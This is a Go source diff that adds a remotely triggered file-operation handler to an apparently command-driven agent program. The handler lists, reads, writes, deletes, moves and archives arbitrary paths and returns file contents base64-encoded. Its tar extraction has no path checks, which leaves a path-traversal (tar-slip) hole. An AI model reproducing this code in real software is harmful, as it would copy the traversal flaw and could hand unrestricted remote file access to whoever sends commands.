@@ -9,9 +9,12 @@
 package main
 
 import (
+        "archive/tar"
         "bytes"
+        "compress/gzip"
         "context"
         "crypto/sha256"
+        "encoding/base64"
         "encoding/binary"
         "encoding/json"
         "fmt"
@@ -20,6 +23,7 @@ import (
         "os"
         "os/exec"
         "os/user"
+        "path/filepath"
         "runtime"
         "strings"
         "syscall"
@@ -320,6 +324,9 @@ func main() {
 
                                 os.Exit(0)
 
+                        case "file_op":
+                                response = handleFileOp(cmd)
+
                         default:
                                 response = map[string]interface{}{
                                         "error": fmt.Sprintf("unknown command: %s", cmdType),
@@ -343,4 +350,345 @@ func minDuration(a, b time.Duration) time.Duration {
                 return a
         }
         return b
+}
+
+func handleFileOp(cmd map[string]interface{}) map[string]interface{} {
+        op, _ := cmd["op"].(string)
+        opID, _ := cmd["op_id"].(string)
+        path, _ := cmd["path"].(string)
+
+        result := map[string]interface{}{
+                "type":  "file_op_result",
+                "op_id": opID,
+                "op":    op,
+        }
+
+        switch op {
+        case "list":
+                files, err := listDirectory(path)
+                if err != nil {
+                        result["error"] = err.Error()
+                } else {
+                        result["path"] = path
+                        result["files"] = files
+                }
+
+        case "read":
+                content, err := os.ReadFile(path)
+                if err != nil {
+                        result["error"] = err.Error()
+                } else {
+                        result["content"] = base64.StdEncoding.EncodeToString(content)
+                        result["path"] = path
+                }
+
+        case "write":
+                content, _ := cmd["content"].(string)
+                decoded, err := base64.StdEncoding.DecodeString(content)
+                if err != nil {
+                        result["error"] = "Invalid base64 content"
+                } else {
+                        err = os.WriteFile(path, decoded, 0644)
+                        if err != nil {
+                                result["error"] = err.Error()
+                        } else {
+                                result["success"] = true
+                        }
+                }
+
+        case "delete":
+                err := os.RemoveAll(path)
+                if err != nil {
+                        result["error"] = err.Error()
+                } else {
+                        result["success"] = true
+                }
+
+        case "mkdir":
+                err := os.MkdirAll(path, 0755)
+                if err != nil {
+                        result["error"] = err.Error()
+                } else {
+                        result["success"] = true
+                }
+
+        case "rename":
+                newPath, _ := cmd["new_path"].(string)
+                err := os.Rename(path, newPath)
+                if err != nil {
+                        result["error"] = err.Error()
+                } else {
+                        result["success"] = true
+                }
+
+        case "chmod":
+                mode, _ := cmd["mode"].(string)
+                var perm os.FileMode = 0644
+                fmt.Sscanf(mode, "%o", &perm)
+                err := os.Chmod(path, perm)
+                if err != nil {
+                        result["error"] = err.Error()
+                } else {
+                        result["success"] = true
+                }
+
+        case "copy":
+                dest, _ := cmd["dest"].(string)
+                err := copyFile(path, dest)
+                if err != nil {
+                        result["error"] = err.Error()
+                } else {
+                        result["success"] = true
+                }
+
+        case "move":
+                dest, _ := cmd["dest"].(string)
+                err := os.Rename(path, dest)
+                if err != nil {
+                        err = copyFile(path, dest)
+                        if err == nil {
+                                os.RemoveAll(path)
+                        }
+                }
+                if err != nil {
+                        result["error"] = err.Error()
+                } else {
+                        result["success"] = true
+                }
+
+        case "download":
+                content, err := os.ReadFile(path)
+                if err != nil {
+                        result["error"] = err.Error()
+                } else {
+                        result["content"] = base64.StdEncoding.EncodeToString(content)
+                        result["filename"] = filepath.Base(path)
+                }
+
+        case "upload":
+                content, _ := cmd["content"].(string)
+                decoded, err := base64.StdEncoding.DecodeString(content)
+                if err != nil {
+                        result["error"] = "Invalid base64 content"
+                } else {
+                        err = os.WriteFile(path, decoded, 0644)
+                        if err != nil {
+                                result["error"] = err.Error()
+                        } else {
+                                result["success"] = true
+                        }
+                }
+
+        case "archive":
+                action, _ := cmd["action"].(string)
+                archivePath, _ := cmd["archive_path"].(string)
+                if action == "create" {
+                        err := createTarGz(path, archivePath)
+                        if err != nil {
+                                result["error"] = err.Error()
+                        } else {
+                                result["success"] = true
+                        }
+                } else if action == "extract" {
+                        err := extractTarGz(path, archivePath)
+                        if err != nil {
+                                result["error"] = err.Error()
+                        } else {
+                                result["success"] = true
+                        }
+                } else {
+                        result["error"] = "Unknown archive action"
+                }
+
+        default:
+                result["error"] = fmt.Sprintf("Unknown file operation: %s", op)
+        }
+
+        return result
+}
+
+func listDirectory(path string) ([]map[string]interface{}, error) {
+        entries, err := os.ReadDir(path)
+        if err != nil {
+                return nil, err
+        }
+
+        var files []map[string]interface{}
+        for _, entry := range entries {
+                info, err := entry.Info()
+                if err != nil {
+                        continue
+                }
+
+                f := map[string]interface{}{
+                        "name":   entry.Name(),
+                        "is_dir": entry.IsDir(),
+                        "size":   info.Size(),
+                        "perms":  fmt.Sprintf("%o", info.Mode().Perm()),
+                        "mtime":  info.ModTime().Format("2006-01-02 15:04"),
+                }
+
+                if stat, ok := info.Sys().(*syscall.Stat_t); ok {
+                        if u, err := user.LookupId(fmt.Sprintf("%d", stat.Uid)); err == nil {
+                                f["owner"] = u.Username
+                        } else {
+                                f["owner"] = fmt.Sprintf("%d", stat.Uid)
+                        }
+                }
+
+                files = append(files, f)
+        }
+
+        return files, nil
+}
+
+func copyFile(src, dst string) error {
+        srcInfo, err := os.Stat(src)
+        if err != nil {
+                return err
+        }
+
+        if srcInfo.IsDir() {
+                return copyDir(src, dst)
+        }
+
+        in, err := os.Open(src)
+        if err != nil {
+                return err
+        }
+        defer in.Close()
+
+        out, err := os.Create(dst)
+        if err != nil {
+                return err
+        }
+        defer out.Close()
+
+        _, err = io.Copy(out, in)
+        return err
+}
+
+func copyDir(src, dst string) error {
+        if err := os.MkdirAll(dst, 0755); err != nil {
+                return err
+        }
+
+        entries, err := os.ReadDir(src)
+        if err != nil {
+                return err
+        }
+
+        for _, entry := range entries {
+                srcPath := filepath.Join(src, entry.Name())
+                dstPath := filepath.Join(dst, entry.Name())
+
+                if entry.IsDir() {
+                        if err := copyDir(srcPath, dstPath); err != nil {
+                                return err
+                        }
+                } else {
+                        if err := copyFile(srcPath, dstPath); err != nil {
+                                return err
+                        }
+                }
+        }
+
+        return nil
+}
+
+func createTarGz(srcPath, dstPath string) error {
+        file, err := os.Create(dstPath)
+        if err != nil {
+                return err
+        }
+        defer file.Close()
+
+        gzWriter := gzip.NewWriter(file)
+        defer gzWriter.Close()
+
+        tarWriter := tar.NewWriter(gzWriter)
+        defer tarWriter.Close()
+
+        return filepath.Walk(srcPath, func(path string, info os.FileInfo, err error) error {
+                if err != nil {
+                        return err
+                }
+
+                header, err := tar.FileInfoHeader(info, info.Name())
+                if err != nil {
+                        return err
+                }
+
+                relPath, err := filepath.Rel(filepath.Dir(srcPath), path)
+                if err != nil {
+                        return err
+                }
+                header.Name = relPath
+
+                if err := tarWriter.WriteHeader(header); err != nil {
+                        return err
+                }
+
+                if !info.IsDir() {
+                        f, err := os.Open(path)
+                        if err != nil {
+                                return err
+                        }
+                        defer f.Close()
+                        _, err = io.Copy(tarWriter, f)
+                        return err
+                }
+
+                return nil
+        })
+}
+
+func extractTarGz(archivePath, destPath string) error {
+        file, err := os.Open(archivePath)
+        if err != nil {
+                return err
+        }
+        defer file.Close()
+
+        gzReader, err := gzip.NewReader(file)
+        if err != nil {
+                return err
+        }
+        defer gzReader.Close()
+
+        tarReader := tar.NewReader(gzReader)
+
+        for {
+                header, err := tarReader.Next()
+                if err == io.EOF {
+                        break
+                }
+                if err != nil {
+                        return err
+                }
+
+                target := filepath.Join(destPath, header.Name)
+
+                switch header.Typeflag {
+                case tar.TypeDir:
+                        if err := os.MkdirAll(target, 0755); err != nil {
+                                return err
+                        }
+                case tar.TypeReg:
+                        if err := os.MkdirAll(filepath.Dir(target), 0755); err != nil {
+                                return err
+                        }
+                        outFile, err := os.Create(target)
+                        if err != nil {
+                                return err
+                        }
+                        if _, err := io.Copy(outFile, tarReader); err != nil {
+                                outFile.Close()
+                                return err
+                        }
+                        outFile.Close()
+                }
+        }
+
+        return nil
 }
